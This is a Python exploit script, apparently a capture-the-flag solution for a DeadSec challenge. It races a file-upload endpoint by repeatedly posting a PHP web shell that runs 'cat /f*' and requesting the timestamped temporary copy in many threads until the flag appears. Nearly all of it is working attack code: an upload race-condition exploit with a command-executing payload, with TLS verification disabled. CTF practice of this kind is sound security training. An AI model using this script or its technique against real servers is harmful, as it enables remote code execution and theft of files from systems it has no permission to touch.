#!/usr/bin/python3
import requests
import threading
import datetime
import os
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

# url = f"http://127.0.0.1/"
url = "https://8ccb7fdb7b0dae5b6f4b5cb1.deadsec.quest/"
max_threads = 35  # Set the maximum number of threads

def access_payload(timestamp):
    file_name = f"shell_{int(timestamp)}.php"
    response = requests.get(url + "tmp/" + file_name, proxies=proxies, verify=False)
    res = response.text
    if "The requested URL was not found on this server" in res:
        return False
    flag = re.findall(r"DEAD{.*}", res)
    if flag:
        print(flag[0])
        print("Killing Task...")
        os.kill(os.getpid(), 9)  # end python process immediately
        return flag

    return flag

def upload_payload():
    file_content = """
    <?php
    system("cat /f*");
    ?>
    """
    files = {"files": ("shell.php", file_content, "application/octet-stream")}
    response = requests.post(url + "upload.php", files=files, proxies=proxies, verify=False)
    return response

if __name__ == "__main__":
    print("Using Max Threads of ", max_threads)
    for i in range(5000):
        current_timestamp = int(datetime.datetime.now().timestamp())  # Get the current time as a timestamp.
        t = threading.Thread(target=access_payload, args=(current_timestamp,))  # run method access_payload with args=current_timestamp
        t2 = threading.Thread(target=upload_payload)

        t2.start()
        t.start()
        if threading.active_count() > max_threads:
            t.join() # wait till t finished
            t2.join() # wait till t2 finished
            print("Max Threads Reached")
